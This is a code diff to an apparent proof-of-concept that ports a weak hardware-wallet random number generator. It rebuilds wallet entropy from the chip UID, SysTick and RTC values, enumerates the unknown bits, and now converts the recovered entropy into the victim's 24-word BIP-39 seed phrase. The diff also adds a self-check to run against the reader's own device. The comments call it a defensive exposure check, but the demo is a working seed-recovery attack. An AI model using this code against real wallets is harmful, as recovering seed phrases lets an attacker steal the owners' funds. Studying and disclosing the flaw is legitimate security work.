@@ -39,10 +39,20 @@ class Yasmarang:
         self.dat = dat & 0xFF
 
     def next_u32(self):
+        # Verbatim port of micropython/ports/stm32/rng.c (Yasmarang, Ilya Levin):
+        #   pad += dat + d * n;
+        #   pad = (pad << 3) + (pad >> 29);
+        #   n = pad | 2;
+        #   d ^= (pad << 31) + (pad >> 1);
+        #   dat ^= (char)pad ^ (d >> 8) ^ 1;
+        #   return pad ^ (d << 5) ^ (pad >> 18) ^ (dat << 1);
+        # The two `+` (not `|`) match the source exactly; the operands never
+        # share bits, so it is a plain rotate either way — but we copy `+` so
+        # this is a byte-faithful reproduction, not a look-alike.
         self.pad = (self.pad + self.dat + self.d * self.n) & MASK32
-        self.pad = ((self.pad << 3) | (self.pad >> 29)) & MASK32   # rotate-left 3
+        self.pad = (((self.pad << 3) & MASK32) + (self.pad >> 29)) & MASK32
         self.n = self.pad | 2
-        self.d = (self.d ^ (((self.pad << 31) | (self.pad >> 1)) & MASK32)) & MASK32
+        self.d = (self.d ^ ((((self.pad << 31) & MASK32) + (self.pad >> 1)) & MASK32)) & MASK32
         self.dat = (self.dat ^ (self.pad & 0xFF) ^ ((self.d >> 8) & 0xFF) ^ 1) & 0xFF
         out = (self.pad ^ ((self.d << 5) & MASK32) ^ (self.pad >> 18) ^ ((self.dat << 1) & MASK32))
         return out & MASK32
@@ -103,6 +113,66 @@ def wallet_entropy(uid_low32, systick_val, rtc_tr, rtc_ssr):
 
 
 # ---------------------------------------------------------------------------
+# BIP-39: turn 32 entropy bytes into the 24 words the device SHOWS you.
+# Needs only SHA-256 + the standard wordlist. No address math, no secp256k1 —
+# nothing that helps move funds. This exists so you can eyeball-compare the
+# output against your OWN device's displayed words (the definitive self-test).
+# ---------------------------------------------------------------------------
+import os
+
+
+def _load_wordlist():
+    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bip39_english.txt")
+    with open(path) as f:
+        words = f.read().split()
+    assert len(words) == 2048, "wordlist must be the 2048-word BIP-39 English list"
+    return words
+
+
+def entropy_to_mnemonic(entropy):
+    """32 bytes (256-bit) entropy -> 24-word BIP-39 mnemonic."""
+    words = _load_wordlist()
+    ent_bits = "".join(f"{b:08b}" for b in entropy)          # 256 bits
+    checksum_bits = f"{hashlib.sha256(entropy).digest()[0]:08b}"  # first 8 bits of SHA-256
+    bits = ent_bits + checksum_bits                          # 264 bits
+    return " ".join(words[int(bits[i:i + 11], 2)] for i in range(0, len(bits), 11))
+
+
+# ---------------------------------------------------------------------------
+# SELF-CHECK — the only definitive "does it reproduce a REAL seed" test.
+# Fill in values from a device YOU OWN, then confirm the code regenerates the
+# 24 words the device displays. This is a defensive exposure check on your own
+# wallet. It does not target, scan, or move anyone's funds.
+# ---------------------------------------------------------------------------
+def self_check():
+    # --- REPLACE these with your own device's real values ---------------
+    # STM32 96-bit UID: first 32-bit word (read the chip UID; the fallback uses
+    #   *(uint32_t*)UID_ADDRESS). SysTick->VAL and RTC->TR/SSR at seed-creation
+    #   time are generally unknown to you, so a self-check normally enumerates
+    #   them the same way the demo does. If you happen to know them, plug in.
+    my_uid_word   = None      # e.g. 0x00410023
+    my_systick    = None      # 0 .. ~80_000
+    my_rtc_tr     = None      # RTC time register value at creation
+    my_rtc_ssr    = None      # RTC sub-second register value at creation
+    my_device_words = ""      # paste the 24 words your COLDCARD displays
+    # --------------------------------------------------------------------
+
+    if None in (my_uid_word, my_systick, my_rtc_tr, my_rtc_ssr) or not my_device_words:
+        print("[self-check] Not configured. Edit self_check() with your own")
+        print("             device values + displayed 24 words to run it.")
+        print("             (Unknown SysTick/RTC? Enumerate them like demo() does.)")
+        return
+
+    ent = wallet_entropy(my_uid_word, my_systick, my_rtc_tr, my_rtc_ssr)
+    got = entropy_to_mnemonic(ent)
+    match = got.split() == my_device_words.split()
+    print(f"[self-check] regenerated words match device: {match}")
+    if match:
+        print("[self-check] Your seed IS reproducible from device values -> AFFECTED.")
+        print("             Migrate: passphrase now, fresh seed on fixed firmware.")
+
+
+# ---------------------------------------------------------------------------
 # DEMONSTRATION — synthetic victim vs. bounded attacker enumeration.
 # ---------------------------------------------------------------------------
 def demo():
@@ -123,8 +193,12 @@ def demo():
         victim_uid_low32, victim_systick, victim_rtc_tr, victim_rtc_ssr
     )
     print(f"\n[victim]  32-byte BIP39 entropy = {victim_entropy.hex()}")
-    print("          (in a real wallet this deterministically yields the")
-    print("           24-word mnemonic and every derived key/address)")
+    victim_words = entropy_to_mnemonic(victim_entropy)
+    print("[victim]  24-word mnemonic (what the device would show):")
+    vw = victim_words.split()
+    for i in range(0, 24, 6):
+        print("          " + " ".join(f"{j+1:>2}.{vw[j]}" for j in range(i, i + 6)))
+    print("          (on a real device this seed derives every key/address)")
 
     # --- Attacker knowledge: approximate creation time + Coldcard UID structure ---
     # Enumerate only the UNKNOWN low bits. This is a bounded, in-memory search
@@ -179,3 +253,5 @@ def demo():
 
 if __name__ == "__main__":
     demo()
+    print()
+    self_check()
